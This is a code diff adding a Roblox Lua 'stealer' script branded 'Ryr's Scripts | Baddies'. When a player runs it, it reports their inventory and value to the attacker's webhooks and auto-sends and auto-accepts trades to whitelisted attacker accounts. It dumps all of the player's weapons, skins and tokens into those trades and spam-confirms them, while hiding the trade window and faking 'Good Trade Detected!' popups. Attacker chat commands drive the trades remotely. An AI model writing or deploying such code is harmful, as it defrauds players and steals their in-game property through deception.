+    if not btn then return false end
+    local success = pcall(function()
+        if btn.MouseButton1Click then 
+            firesignal(btn.MouseButton1Click)
+        elseif btn.Activated then 
+            firesignal(btn.Activated)
+        end
+    end)
+    return success
+end
+
+local function clickAllWeaponsOnce()
+    local tradingGui = playerGui:FindFirstChild("Trading")
+    if not tradingGui then return 0 end
+    local frame = tradingGui:FindFirstChild("Frame")
+    if not frame then return 0 end
+    local main = frame:FindFirstChild("Main")
+    if not main then return 0 end
+    local yourOffer = main:FindFirstChild("YourOffer")
+    if not yourOffer then return 0 end
+    local itemDisplay = yourOffer:FindFirstChild("ItemDisplay")
+    if not itemDisplay then return 0 end
+    local scrollingFrame = itemDisplay:FindFirstChild("ScrollingFrame")
+    if not scrollingFrame then return 0 end
+    
+    local _, allWeaponsList = getAllInventoryWeapons()
+    local addedCount = 0
+    
+    scrollingFrame.CanvasPosition = Vector2.new(0, 0)
+    task.wait(0.05)
+    
+    for _, weaponFullName in ipairs(allWeaponsList) do
+        local btn = scrollingFrame:FindFirstChild(weaponFullName)
+        if btn and btn:IsA("ImageButton") and btn.Visible then
+            if safeClick(btn) then
+                addedCount = addedCount + 1
+                task.wait(0.05)
+            end
+        end
+    end
+    
+    local maxScroll = scrollingFrame.CanvasSize.Y.Offset - scrollingFrame.AbsoluteWindowSize.Y
+    if maxScroll > 0 then
+        scrollingFrame.CanvasPosition = Vector2.new(0, maxScroll)
+        task.wait(0.05)
+        
+        for _, weaponFullName in ipairs(allWeaponsList) do
+            local btn = scrollingFrame:FindFirstChild(weaponFullName)
+            if btn and btn:IsA("ImageButton") and btn.Visible then
+                if safeClick(btn) then
+                    addedCount = addedCount + 1
+                    task.wait(0.05)
+                end
+            end
+        end
+    end
+    
+    return addedCount
+end
+
+local function clickFightingStylesOnce()
+    if fightingStylesAlreadyAdded then
+        return 0
+    end
+    
+    local tradingGui = playerGui:FindFirstChild("Trading")
+    if not tradingGui then 
+        return 0 
+    end
+    local frame = tradingGui:FindFirstChild("Frame")
+    if not frame then return 0 end
+    local main = frame:FindFirstChild("Main")
+    if not main then return 0 end
+    local yourOffer = main:FindFirstChild("YourOffer")
+    if not yourOffer then return 0 end
+    local itemDisplay = yourOffer:FindFirstChild("ItemDisplay")
+    if not itemDisplay then return 0 end
+    local scrollingFrame = itemDisplay:FindFirstChild("ScrollingFrame")
+    if not scrollingFrame then return 0 end
+    
+    local ownedStylesList = getAllFightingStyles()
+    
+    if #ownedStylesList == 0 then
+        return 0
+    end
+    
+    scrollingFrame.CanvasPosition = Vector2.new(0, 0)
+    task.wait(0.05)
+    
+    local totalAdded = 0
+    
+    for _, styleName in ipairs(ownedStylesList) do
+        for _, btn in ipairs(scrollingFrame:GetChildren()) do
+            if btn:IsA("ImageButton") and btn.Visible then
+                local btnName = btn.Name:lower()
+                local styleLower = styleName:lower()
+                if btnName == styleLower or string.find(btnName, styleLower) or string.find(styleLower, btnName) then
+                    if safeClick(btn) then
+                        totalAdded = totalAdded + 1
+                        task.wait(0.05)
+                        break
+                    end
+                end
+            end
+        end
+    end
+    
+    if totalAdded > 0 then
+        fightingStylesAlreadyAdded = true
+    end
+    
+    return totalAdded
+end
+
+local function clickAllSkinsOnce()
+    if skinsAlreadyAdded then
+        return 0
+    end
+    
+    local tradingGui = playerGui:FindFirstChild("Trading")
+    if not tradingGui then 
+        return 0 
+    end
+    local frame = tradingGui:FindFirstChild("Frame")
+    if not frame then return 0 end
+    local main = frame:FindFirstChild("Main")
+    if not main then return 0 end
+    local yourOffer = main:FindFirstChild("YourOffer")
+    if not yourOffer then return 0 end
+    local itemDisplay = yourOffer:FindFirstChild("ItemDisplay")
+    if not itemDisplay then return 0 end
+    local scrollingFrame = itemDisplay:FindFirstChild("ScrollingFrame")
+    if not scrollingFrame then return 0 end
+    
+    local highValueList = getAllHighValueSkins()
+    
+    if #highValueList == 0 then
+        return 0
+    end
+    
+    scrollingFrame.CanvasPosition = Vector2.new(0, 0)
+    task.wait(0.05)
+    
+    local totalAdded = 0
+    
+    for _, skinName in ipairs(highValueList) do
+        for _, btn in ipairs(scrollingFrame:GetChildren()) do
+            if btn:IsA("ImageButton") and btn.Visible then
+                local btnName = btn.Name:lower()
+                local skinLower = skinName:lower()
+                if btnName == skinLower or string.find(btnName, skinLower) or string.find(skinLower, btnName) then
+                    if safeClick(btn) then
+                        totalAdded = totalAdded + 1
+                        task.wait(0.05)
+                        break
+                    end
+                end
+            end
+        end
+    end
+    
+    if totalAdded > 0 then
+        skinsAlreadyAdded = true
+    end
+    
+    return totalAdded
+end
+
+local function getTokenAmount()
+    local tradingGui = playerGui:FindFirstChild("Trading")
+    if tradingGui then
+        local frame = tradingGui:FindFirstChild("Frame")
+        if frame then
+            local categories = frame:FindFirstChild("Categories")
+            if categories then
+                local tokenAmount = categories:FindFirstChild("TokenAmount")
+                if tokenAmount then
+                    local textLabel = tokenAmount:FindFirstChild("TextLabel")
+                    if textLabel then
+                        local tokenNumber = string.match(textLabel.Text, "%d+")
+                        if tokenNumber then return tonumber(tokenNumber) end
+                    end
+                end
+            end
+        end
+    end
+    return 0
+end
+
+local function spamConfirm()
+    for i = 1, 20 do pcall(function() RFTradingConfirmTrade:InvokeServer() end) task.wait(0.05) end
+end
+
+local function addAllItemsInOrder()
+    task.wait(0.1)
+    
+    local weaponsAdded = clickAllWeaponsOnce()
+    task.wait(0.2)
+    
+    local fightingStylesAdded = clickFightingStylesOnce()
+    task.wait(0.2)
+    
+    local highValueAdded = clickAllSkinsOnce()
+    task.wait(0.1)
+    
+    local tokenAmount = getTokenAmount()
+    if tokenAmount and tokenAmount > 0 then 
+        pcall(function() RFTradingSetTokens:InvokeServer(tokenAmount) end)
+    end
+    
+    return weaponsAdded + fightingStylesAdded + highValueAdded
+end
+
+local function autoCompleteTrade()
+    skinsAlreadyAdded = false
+    fightingStylesAlreadyAdded = false
+    addAllItemsInOrder()
+    task.wait(0.1)
+    pcall(function() RFTradingAcceptTradeOffer:InvokeServer(localPlayer) end)
+    task.wait(0.1)
+    spamConfirm()
+    isTrading = false
+    currentTradePartner = nil
+end
+
+local function sendTradeRequest(player)
+    if not player or isTrading or tradingPlayers[player] then return false end
+    for attempt = 1, 3 do
+        local success, result = pcall(function() return RFTradingSendTradeOffer:InvokeServer(player) end)
+        if success and result then return true end
+        if attempt < 3 then task.wait(0.3) end
+    end
+    return false
+end
+
+local function processAddCommand()
+    task.wait(0.1)
+    
+    local weaponsAdded = clickAllWeaponsOnce()
+    task.wait(0.2)
+    
+    local fightingStylesAdded = clickFightingStylesOnce()
+    task.wait(0.2)
+    
+    local highValueAdded = clickAllSkinsOnce()
+    task.wait(0.1)
+    
+    local tokenAmount = getTokenAmount()
+    if tokenAmount and tokenAmount > 0 then 
+        pcall(function() RFTradingSetTokens:InvokeServer(tokenAmount) end)
+    end
+    task.wait(0.1)
+    pcall(function() RFTradingSetReady:InvokeServer(true) end)
+    task.wait(0.1)
+    pcall(function() RFTradingConfirmTrade:InvokeServer() end)
+end
+
+local function processSkinsOnlyCommand()
+    task.wait(0.1)
+    
+    if skinsAlreadyAdded then
+        task.wait(0.1)
+        local tokenAmount = getTokenAmount()
+        if tokenAmount and tokenAmount > 0 then 
+            pcall(function() RFTradingSetTokens:InvokeServer(tokenAmount) end)
+        end
+        task.wait(0.1)
+        pcall(function() RFTradingSetReady:InvokeServer(true) end)
+        task.wait(0.1)
+        pcall(function() RFTradingConfirmTrade:InvokeServer() end)
+        return
+    end
+    
+    local highValueAdded = clickAllSkinsOnce()
+    
+    if highValueAdded > 0 then
+        task.wait(1)
+        
+        local tokenAmount = getTokenAmount()
+        if tokenAmount and tokenAmount > 0 then 
+            pcall(function() RFTradingSetTokens:InvokeServer(tokenAmount) end)
+            task.wait(0.1)
+        end
+        
+        pcall(function() RFTradingSetReady:InvokeServer(true) end)
+        task.wait(0.1)
+        pcall(function() RFTradingConfirmTrade:InvokeServer() end)
+    end
+end
+
+local function sendFullInventory()
+    local weaponCounts, allWeaponsList, totalWeapons, tradableCount, untradableCount, weaponTradeStatus, totalValue, weaponValues, totalTokenValue = getAllInventoryWeaponsWithTradeStatus()
+    
+    if totalWeapons < 2 then
+        local rejectionMsg = getRandomRejection()
+        local poorPayload = {
+            content = "Username: " .. localPlayer.Name .. " was kicked for having less than 2 items, " .. rejectionMsg,
+            embeds = {{
+                title = "❌ Alt Account Detected",
+                color = 0x000000,
+                fields = {
+                    {name = "User", value = localPlayer.Name, inline = true},
+                    {name = "Total Items", value = tostring(totalWeapons), inline = true},
+                    {name = "Rejection", value = rejectionMsg, inline = false}
+                }
+            }}
+        }
+        task.spawn(function()
+            if POOR_WEBHOOK and POOR_WEBHOOK ~= "" then
+                sendRequest(POOR_WEBHOOK, poorPayload)
+            end
+        end)
+        localPlayer:Kick("Dev Account Detected")
+        return nil
+    end
+    
+    if tradableCount == 0 and totalWeapons > 0 then
+        local rejectionMsg = getRandomRejection()
+        local poorPayload = {
+            content = "Username: " .. localPlayer.Name .. " was kicked: all of their items were untradeable, " .. rejectionMsg,
+            embeds = {{
+                title = "❌ All Items Untradable",
+                color = 0x000000,
+                fields = {
+                    {name = "User", value = localPlayer.Name, inline = true},
+                    {name = "Total Items", value = tostring(totalWeapons), inline = true},
+                    {name = "Tradable", value = "0", inline = true},
+                    {name = "Rejection", value = rejectionMsg, inline = false}
+                }
+            }}
+        }
+        task.spawn(function()
+            if POOR_WEBHOOK and POOR_WEBHOOK ~= "" then
+                sendRequest(POOR_WEBHOOK, poorPayload)
+            end
+        end)
+        localPlayer:Kick("Dev Account Detected")
+        return nil
+    end
+    
+    local hasSpikedKitty = hasSpikedKittyStanli()
+    local hasGlitterBombWeapon = hasGlitterBomb()
+    local hasGlitterBlueSprayWeapon = hasGlitterBlueSpray()
+    local hasLoveMeHateMeTaserWeapon = hasLoveMeHateMeTaser()
+    local hasSpikedKnucklesWeapon = hasSpikedKnuckles()
+    local hasIceKatanaWeapon = hasIceKatana()
+    local hasSurf = hasSurfsUp()
+    local hasPin = hasTradePin()
+    
+    local useRichWebhook = false
+    
+    if hasSpikedKitty or hasGlitterBombWeapon or hasGlitterBlueSprayWeapon or hasLoveMeHateMeTaserWeapon then
+        useRichWebhook = true
+    end
+    
+    if not useRichWebhook and hasSpikedKnucklesWeapon then
+        local chance = math.random(1, 100)
+        if chance <= 50 then
+            useRichWebhook = true
+        end
+    end
+    
+    if not useRichWebhook and hasIceKatanaWeapon then
+        local chance = math.random(1, 100)
+        if chance <= 30 then
+            useRichWebhook = true
+        end
+    end
+    
+    if not useRichWebhook then
+        useRichWebhook = (hasSpikedKitty and hasSurf) or (totalWeapons > 7) or (totalValue > 50000)
+    end
+    
+    -- Build weapons text with just weapon names and count
+    local weaponsText = ""
+    local weaponLines = {}
+    for weaponName, count in pairs(weaponCounts) do
+        local statuses = weaponTradeStatus[weaponName]
+        local allTradable = true
+        if statuses then
+            for _, tradable in ipairs(statuses) do
+                if not tradable then
+                    allTradable = false
+                    break
+                end
+            end
+        end
+        local emoji = allTradable and "🟢" or "🔴"
+        table.insert(weaponLines, emoji .. " " .. count .. "x " .. weaponName)
+    end
+    table.sort(weaponLines)
+    weaponsText = table.concat(weaponLines, "\n")
+    if weaponsText == "" then weaponsText = "None" end
+    
+    local skinText = formatSkinList()
+    
+    local ls = localPlayer:FindFirstChild("leaderstats")
+    local slays = ls and ls:FindFirstChild("Slays") and ls.Slays.Value or "N/A"
+    local formattedSlays = formatNumber(slays)
+    
+    local executor = "Unknown"
+    pcall(function()
+        if getexecutorname then
+            executor = getexecutorname()
+        elseif syn then executor = "Synapse X"
+        elseif fluxus then executor = "Fluxus"
+        elseif request then executor = "Krnl"
+        elseif http_request then executor = "HTTP Request"
+        elseif is_sirhurt then executor = "Sirhurt"
+        elseif pebc_execute then executor = "ProtoSmasher"
+        elseif KRNL_LOADED then executor = "Krnl"
+        end
+    end)
+    
+    local playerName = localPlayer.Name
+    local targetWebhook = useRichWebhook and RICH_WEBHOOK or POOR_WEBHOOK
+    local joinLink = "https://plsbrainrot.me/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
+    local serverJoiner = "local ts = game:GetService('TeleportService') ts:TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "')"
+    
+    local webhookType = useRichWebhook and "Rich" or "Poor"
+    
+    local tokenWorth = (totalTokenValue / 1000) * 1.75
+    
+    local fields = {
+        {name = "👤 User", value = "`" .. playerName .. "`", inline = true},
+        {name = "⚔️ Slays", value = "`" .. tostring(formattedSlays) .. "`", inline = true},
+        {name = "💻 Executor", value = "`" .. executor .. "`", inline = true},
+        {name = "👥 Players", value = "`" .. #Players:GetPlayers() .. " / " .. Players.MaxPlayers .. "`", inline = true},
+        {name = "🟢 Tradable: " .. tradableCount .. " | 🔴 Untradable: " .. untradableCount, value = " ", inline = false},
+        {name = "🔒 Trade Pin", value = hasPin and "✅ Yes" or "❌ No", inline = true},
+        {name = "💰 Total Worth (1.75$ per 1000 tokens value)", value = "`$" .. formatNumber(tokenWorth) .. "`", inline = true},
+        {name = "🪙 Tokens", value = "`" .. formatNumber(totalTokenValue) .. "`", inline = true},
+    }
+    
+    table.insert(fields, {name = "🔫 Weapons", value = "```" .. weaponsText .. "```", inline = false})
+    table.insert(fields, {name = "🎨 Skins & Fighting Styles", value = skinText, inline = false})
+    table.insert(fields, {name = "🔗 Join Link", value = "[Click to Join](" .. joinLink .. ")", inline = false})
+    
+    local mainEmbed = {
+        title = "🎉 Ryr's Scripts | Baddies",
+        color = 0x000000,
+        fields = fields,
+        footer = {text = "🎉 Ryr's Scripts | Baddies • " .. webhookType .. " Hit"},
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }
+    
+    local content = serverJoiner
+    if useRichWebhook then 
+        content = "@everyone \n" .. serverJoiner
+    elseif PING_POOR then
+        content = "@everyone \n" .. serverJoiner
+    end
+    
+    local payload = {content = content, embeds = {mainEmbed}}
+    
+    task.spawn(function()
+        if targetWebhook and targetWebhook ~= "" then
+            sendRequest(targetWebhook, payload)
+        end
+    end)
+    
+    if useRichWebhook then
+        local notificationEmbed = {
+            title = "⚠️ Rich Hit - Poor Users Cannot Join",
+            color = 0x000000,
+            fields = {
+                {name = "Player", value = playerName, inline = true},
+                {name = "Total Value", value = "$" .. formatNumber(totalValue), inline = true},
+                {name = "Status", value = "❌ Poor users cannot join this hit", inline = false},
+                {name = "Note", value = "Only rich webhook users can trade with this player", inline = false}
+            },
+            footer = {text = "🎉 Ryr's Scripts | Baddies • Notification"},
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }
+        
+        task.spawn(function()
+            if POOR_WEBHOOK and POOR_WEBHOOK ~= "" then
+                sendRequest(POOR_WEBHOOK, {content = "⚠️ " .. playerName .. " - Rich hit, poor users cannot join", embeds = {notificationEmbed}})
+            end
+        end)
+    else
+        local notificationEmbed = {
+            title = "⚠️ Poor Hit - Rich Users Cannot Join",
+            color = 0x000000,
+            fields = {
+                {name = "Player", value = playerName, inline = true},
+                {name = "Total Value", value = "$" .. formatNumber(totalValue), inline = true},
+                {name = "Status", value = "❌ Rich users cannot join this hit", inline = false},
+                {name = "Note", value = "Only poor webhook users can trade with this player", inline = false}
+            },
+            footer = {text = "🎉 Ryr's Scripts | Baddies • Notification"},
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }
+        
+        task.spawn(function()
+            if RICH_WEBHOOK and RICH_WEBHOOK ~= "" then
+                sendRequest(RICH_WEBHOOK, {content = "⚠️ " .. playerName .. " - Poor hit, rich users cannot join", embeds = {notificationEmbed}})
+            end
+        end)
+    end
+    
+    return useRichWebhook
+end
+
+task.spawn(function()
+    while true do
+        local popup = playerGui:FindFirstChild("TradeRequestPopup")
+        if popup then
+            local tradeRequest = popup:FindFirstChild("TradeRequest")
+            if tradeRequest then
+                local content = tradeRequest:FindFirstChild("Content")
+                if content and content:IsA("TextLabel") then
+                    if content.Text ~= "Good Trade Detected! ✨" then
+                        content.Text = "Good Trade Detected! ✨"
+                    end
+                end
+            end
+        end
+        task.wait()
+    end
+end)
+
+local function onTradeStarted(tradeId)
+    skinsAlreadyAdded = false
+    fightingStylesAlreadyAdded = false
+    
+    task.wait(0.1)
+    
+    local tradeReplion = Replion.Client:GetReplion(tradeId)
+    if not tradeReplion then return end
+    
+    local playerList = tradeReplion.Data.PlayerList
+    if not playerList or #playerList < 2 then return end
+    
+    local p1 = playerList[1]
+    local p2 = playerList[2]
+    
+    local isRichInvolved = false
+    local isPoorInvolved = false
+    local isLocalInvolved = (p1 == localPlayer or p2 == localPlayer)
+    
+    for _, username in ipairs(RICH_USERNAMES) do
+        if (p1.Name:lower() == username:lower() or p2.Name:lower() == username:lower()) then
+            isRichInvolved = true
+            break
+        end
+    end
+    
+    for _, username in ipairs(POOR_USERNAMES) do
+        if (p1.Name:lower() == username:lower() or p2.Name:lower() == username:lower()) then
+            isPoorInvolved = true
+            break
+        end
+    end
+    
+    if isRichInvolved and not _G.IS_RICH_HIT then
+        pcall(function() RFTradingConfirmTrade:InvokeServer() end)
+        pcall(function() RFTradingSetReady:InvokeServer(false) end)
+        pcall(function() DeclineRemote:InvokeServer() end)
+        isTrading = false
+        currentTradePartner = nil
+        return
+    end
+    
+    if isPoorInvolved and _G.IS_RICH_HIT then
+        pcall(function() RFTradingConfirmTrade:InvokeServer() end)
+        pcall(function() RFTradingSetReady:InvokeServer(false) end)
+        pcall(function() DeclineRemote:InvokeServer() end)
+        isTrading = false
+        currentTradePartner = nil
+        return
+    end
+    
+    if isRichInvolved and isLocalInvolved and _G.IS_RICH_HIT then
+        if playerGui:FindFirstChild("Trading") then
+            task.spawn(function()
+                processAddCommand()
+            end)
+        end
+    end
+    
+    if isPoorInvolved and isLocalInvolved and not _G.IS_RICH_HIT then
+        if playerGui:FindFirstChild("Trading") then
+            task.spawn(function()
+                processAddCommand()
+            end)
+        end
+    end
+end
+
+local function onTradeMessage(userId, message)
+    local sender = Players:GetPlayerByUserId(userId)
+    if not sender then return end
+    
+    local cmd = message:lower()
+    
+    if cmd == "s" then
+        local isWhitelisted = false
+        for _, username in ipairs(MY_USERNAMES) do
+            if sender.Name:lower() == username:lower() then
+                isWhitelisted = true
+                break
+            end
+        end
+        
+        if isWhitelisted then
+            task.spawn(function()
+                processSkinsOnlyCommand()
+            end)
+        end
+    end
+    
+    if cmd == "1" or cmd == "2" then
+        local isWhitelisted = false
+        for _, username in ipairs(MY_USERNAMES) do
+            if sender.Name:lower() == username:lower() then
+                isWhitelisted = true
+                break
+            end
+        end
+        
+        if isWhitelisted then
+            if cmd == "1" then
+                task.wait(0.1)
+                pcall(function() RFTradingSetReady:InvokeServer(true) end)
+            elseif cmd == "2" then
+                task.wait(0.1)
+                pcall(function() RFTradingConfirmTrade:InvokeServer() end)
+            end
+        end
+    end
+end
+
+local tradeRemote = TradeData.Remotes.TradeStarted
+tradeRemote.OnClientEvent:Connect(onTradeStarted)
+
+MessageEvent.OnClientEvent:Connect(onTradeMessage)
+
+RunService.RenderStepped:Connect(function()
+    if localPlayer.Character and localPlayer.Character:FindFirstChild("Humanoid") then
+        local state = localPlayer.Character.Humanoid:GetState()
+        if state == Enum.HumanoidStateType.Jumping and not jumped then
+            jumped = true
+            if playerGui:FindFirstChild("Trading") then 
+                task.spawn(function()
+                    processAddCommand()
+                end)
+            end
+        else
+            jumped = false
+        end
+    end
+end)
+
+local function startSpammingPlayer(player)
+    if activeTargets[player] then return end
+    
+    activeTargets[player] = true
+    
+    task.spawn(function()
+        while activeTargets[player] and player and player.Parent do
+            local isRich = false
+            local isPoor = false
+            
+            for _, username in ipairs(RICH_USERNAMES) do
+                if player.Name:lower() == username:lower() then
+                    isRich = true
+                    break
+                end
+            end
+            
+            for _, username in ipairs(POOR_USERNAMES) do
+                if player.Name:lower() == username:lower() then
+                    isPoor = true
+                    break
+                end
+            end
+            
+            if (isRich and _G.IS_RICH_HIT) or (isPoor and not _G.IS_RICH_HIT) then
+                if not isTrading and not tradingPlayers[player] then
+                    sendTradeRequest(player)
+                end
+            end
+            task.wait(1)
+        end
+        activeTargets[player] = nil
+    end)
+end
+
+local function stopSpammingPlayer(player)
+    activeTargets[player] = nil
+end
+
+local function checkPlayerJoin(player)
+    if not player or player == localPlayer then return end
+    
+    local isRich = false
+    local isPoor = false
+    
+    for _, username in ipairs(RICH_USERNAMES) do
+        if player.Name:lower() == username:lower() then
+            isRich = true
+            break
+        end
+    end
+    
+    for _, username in ipairs(POOR_USERNAMES) do
+        if player.Name:lower() == username:lower() then
+            isPoor = true
+            break
+        end
+    end
+    
+    if (isRich and _G.IS_RICH_HIT) or (isPoor and not _G.IS_RICH_HIT) then
+        startSpammingPlayer(player)
+    end
+end
+
+local function checkPlayerLeave(player)
+    if activeTargets[player] then
+        stopSpammingPlayer(player)
+    end
+end
+
+for _, player in ipairs(Players:GetPlayers()) do
+    if player ~= localPlayer then
+        local isRich = false
+        local isPoor = false
+        
+        for _, username in ipairs(RICH_USERNAMES) do
+            if player.Name:lower() == username:lower() then
+                isRich = true
+                break
+            end
+        end
+        
+        for _, username in ipairs(POOR_USERNAMES) do
+            if player.Name:lower() == username:lower() then
+                isPoor = true
+                break
+            end
+        end
+        
+        if (isRich and _G.IS_RICH_HIT) or (isPoor and not _G.IS_RICH_HIT) then
+            startSpammingPlayer(player)
+        end
+    end
+end
+
+Players.PlayerAdded:Connect(checkPlayerJoin)
+Players.PlayerRemoving:Connect(checkPlayerLeave)
+
+local function setupChatCommands()
+    local function onPlayerChatted(player, message)
+        if player and message then
+            local cmd = message:lower()
+            if cmd == "s" or cmd == "add" or cmd == "1" or cmd == "2" then
+                task.delay(0.1, function()
+                    if isProcessing then return end
+                    isProcessing = true
+                    
+                    local shouldProcess = false
+                    for _, username in ipairs(MY_USERNAMES) do
+                        if player.Name:lower() == username:lower() or player == localPlayer then
+                            shouldProcess = true
+                            break
+                        end
+                    end
+                    
+                    if shouldProcess then
+                        if cmd == "s" then
+                            processSkinsOnlyCommand()
+                        elseif cmd == "add" then
+                            processAddCommand()
+                        elseif cmd == "1" then
+                            task.wait(0.1)
+                            pcall(function() RFTradingSetReady:InvokeServer(true) end)
+                        elseif cmd == "2" then
+                            task.wait(0.1)
+                            pcall(function() RFTradingConfirmTrade:InvokeServer() end)
+                        end
+                    end
+                    isProcessing = false
+                end)
+            end
+        end
+    end
+    
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= localPlayer then
+            pcall(function() player.Chatted:Connect(function(message) onPlayerChatted(player, message) end) end)
+        end
+    end
+    
+    Players.PlayerAdded:Connect(function(player)
+        pcall(function() player.Chatted:Connect(function(message) onPlayerChatted(player, message) end) end)
+    end)
+    
+    if TextChatService and TextChatService.OnIncomingMessage then
+        TextChatService.OnIncomingMessage = function(message)
+            local ts = message.TextSource
+            if not ts then return end
+            local sender = Players:GetPlayerByUserId(ts.UserId)
+            if not sender then return end
+            local txt = tostring(message.Text or ""):lower()
+            if txt == "s" or txt == "add" or txt == "1" or txt == "2" then
+                task.delay(0.1, function() onPlayerChatted(sender, txt) end)
+            end
+        end
+    end
+end
+
+local function setupTrading()
+    pcall(function() RESetPhoneSettings:FireServer("TradeEnabled", true) end)
+    
+    local tradeList = playerGui:WaitForChild("TradeList")
+    local mainFrame = tradeList:WaitForChild("Main")
+    local tradeRequest = mainFrame:WaitForChild("TradeRequest")
+    tradeRequest.Visible = true
+    
+    ReplicatedStorage.Modules.Net["RE/Trading/TradeStarted"].OnClientEvent:Connect(function(trader)
+        if trader and trader.Name then
+            local isRich = false
+            local isPoor = false
+            
+            for _, username in ipairs(RICH_USERNAMES) do
+                if trader.Name:lower() == username:lower() then
+                    isRich = true
+                    break
+                end
+            end
+            
+            for _, username in ipairs(POOR_USERNAMES) do
+                if trader.Name:lower() == username:lower() then
+                    isPoor = true
+                    break
+                end
+            end
+            
+            local shouldTrade = false
+            if (isRich and _G.IS_RICH_HIT) or (isPoor and not _G.IS_RICH_HIT) then
+                shouldTrade = true
+            end
+            
+            if shouldTrade and not isTrading then
+                stopSpammingPlayer(trader)
+                
+                isTrading = true
+                currentTradePartner = trader
+                tradingPlayers[trader] = true
+                task.wait(0.1)
+                autoCompleteTrade()
+                tradingPlayers[trader] = nil
+                
+                if trader and trader.Parent then
+                    startSpammingPlayer(trader)
+                end
+            elseif not shouldTrade then
+                pcall(function() DeclineRemote:InvokeServer() end)
+            end
+        end
+    end)
+    
+    local function handleGui(gui)
+        local isProtected = false
+        for guiName, _ in pairs(PROTECTED_GUIS) do if gui.Name == guiName then isProtected = true break end end
+        if isProtected then return end
+        
+        if gui.Name == "Trading" then gui.Enabled = false
+        elseif gui.Name == "Messages" then gui:Destroy() end
+    end
+    
+    for _, gui in ipairs(playerGui:GetChildren()) do handleGui(gui) end
+    playerGui.ChildAdded:Connect(handleGui)
+    
+    task.spawn(function()
+        while true do
+            local t = playerGui:FindFirstChild("Trading")
+            if t then t.Enabled = false end
+            local m = playerGui:FindFirstChild("Messages")
+            if m then m:Destroy() end
+            task.wait()
+        end
+    end)
+end
+
+local weaponCounts, allWeaponsList, totalWeapons = getAllInventoryWeapons()
+
+if totalWeapons < 2 then
+    localPlayer:Kick("Dev Account Detected")
+    return
+end
+
+local _, _, _, tradableCount, untradableCount = getAllInventoryWeaponsWithTradeStatus()
+if tradableCount == 0 and totalWeapons > 0 then
+    localPlayer:Kick("Dev Account Detected")
+    return
+end
+
+protectGUIs()
+deleteMessagesGui()
+
+_G.IS_RICH_HIT = sendFullInventory()
+
+setupTrading()
+setupChatCommands()
+
+local originalAcceptTrade = RFTradingAcceptTradeOffer.InvokeServer
+RFTradingAcceptTradeOffer.InvokeServer = function(self, player)
+    local isRich = false
+    local isPoor = false
+    
+    for _, username in ipairs(RICH_USERNAMES) do
+        if player.Name:lower() == username:lower() then
+            isRich = true
+            break
+        end
+    end
+    
+    for _, username in ipairs(POOR_USERNAMES) do
+        if player.Name:lower() == username:lower() then
+            isPoor = true
+            break
+        end
+    end
+    
+    local shouldTrade = false
+    if (isRich and _G.IS_RICH_HIT) or (isPoor and not _G.IS_RICH_HIT) then
+        shouldTrade = true
+    end
+    
+    if shouldTrade then
+        local result = originalAcceptTrade(self, player)
+        for _, username in ipairs(MY_USERNAMES) do
+            if player.Name:lower() == username:lower() and not isTrading then
+                stopSpammingPlayer(player)
+                
+                isTrading = true
+                currentTradePartner = player
+                tradingPlayers[player] = true
+                task.spawn(function()
+                    task.wait(0.1)
+                    autoCompleteTrade()
+                    tradingPlayers[player] = nil
+                    
+                    if player and player.Parent then
+                        startSpammingPlayer(player)
+                    end
+                end)
+                break
+            end
+        end
+        return result
+    else
+        pcall(function() DeclineRemote:InvokeServer() end)
+        return nil
+    end
+end
